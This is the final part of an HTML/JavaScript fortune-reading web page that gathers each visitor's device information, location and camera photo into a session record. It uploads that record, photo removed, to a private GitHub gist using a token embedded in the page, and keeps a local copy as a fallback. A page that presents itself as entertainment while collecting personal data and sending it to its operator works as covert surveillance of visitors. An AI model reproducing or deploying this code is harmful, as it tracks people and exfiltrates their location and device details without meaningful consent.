                logData('GitHub token not configured - using local storage');
                localStorage.setItem(`fortune_${collectedData.sessionId}`, JSON.stringify(collectedData));
                return;
            }
            
            try {
                // Prepare data (remove large photo for GitHub)
                const uploadData = {
                    ...collectedData,
                    photoData: collectedData.photoData ? '[PHOTO_DATA_REMOVED]' : null
                };
                
                const gistData = {
                    description: `2026 Fortune Reading - Month ${selectedMonth}`,
                    public: false,
                    files: {
                        [`fortune_${collectedData.sessionId}.json`]: {
                            content: JSON.stringify(uploadData, null, 2)
                        }
                    }
                };
                
                const response = await fetch('https://api.github.com/gists', {
                    method: 'POST',
                    headers: {
                        'Authorization': `token ${GITHUB_TOKEN}`,
                        'Accept': 'application/vnd.github.v3+json',
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(gistData)
                });
                
                if (response.ok) {
                    const result = await response.json();
                    collectedData.gistUrl = result.html_url;
                    logData(`‚úÖ Data saved to GitHub: ${result.html_url}`);
                } else {
                    throw new Error('GitHub save failed');
                }
                
            } catch (error) {
                logData(`‚ùå GitHub save failed: ${error.message}`);
                // Fallback to localStorage
                localStorage.setItem(`fortune_${collectedData.sessionId}`, JSON.stringify(collectedData));
            }
        }

        function shareResult(platform) {
            const zodiac = zodiacData[selectedMonth];
            const animal = collectedData.spiritAnimal;
            
            const message = `üåü My 2026 Fortune: ${zodiac.sign}\n` +
                          `üéØ Spirit Animal: ${animal.emoji} ${animal.name}\n` +
                          `üí´ Quote: "${zodiac.quote}"\n` +
                          `üîÆ Full reading: ${window.location.href}`;
            
            let url = '';
            switch(platform) {
                case 'whatsapp':
                    url = `https://wa.me/?text=${encodeURIComponent(message)}`;
                    break;
                case 'facebook':
                    url = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(window.location.href)}`;
                    break;
                case 'twitter':
                    url = `https://twitter.com/intent/tweet?text=${encodeURIComponent(message)}`;
                    break;
            }
            
            if (url) {
                window.open(url, '_blank', 'width=600,height=400');
            }
        }

        function restart() {
            // Reset everything
            selectedMonth = null;
            cameraStream = null;
            userPhoto = null;
            userLocation = null;
            
            // Create new session
            collectedData = {
                sessionId: 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
                birthMonth: null,
                zodiac: {},
                spiritAnimal: {},
                collectedAt: new Date().toISOString(),
                deviceInfo: {},
                locationData: {},
                photoData: null,
                gistUrl: null
            };
            
            // Reset UI
            document.querySelectorAll('.month-btn').forEach(btn => {
                btn.classList.remove('selected');
            });
            
            // Reset camera
            document.getElementById('cameraOverlay').style.display = 'flex';
            const video = document.getElementById('cameraVideo');
            if (video.srcObject) {
                video.srcObject.getTracks().forEach(track => track.stop());
                video.srcObject = null;
            }
            
            // Reset data log
            document.getElementById('dataLog').innerHTML = '<div class="log-entry">Initializing fortune reading...</div>';
            
            // Hide skip button
            document.getElementById('skipBtn').style.display = 'none';
            
            // Auto-select current month
            const currentMonth = new Date().getMonth() + 1;
            document.querySelector(`.month-btn[data-month="${currentMonth}"]`).click();
            
            showScreen(1);
        }

        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // Debug functions
        window.showData = () => {
            console.log('üìä Collected Data:', collectedData);
            alert(JSON.stringify(collectedData, null, 2));
        };
        
        window.clearData = () => {
            localStorage.clear();
            alert('All local data cleared!');
        };
    </script>
</body>
</html>
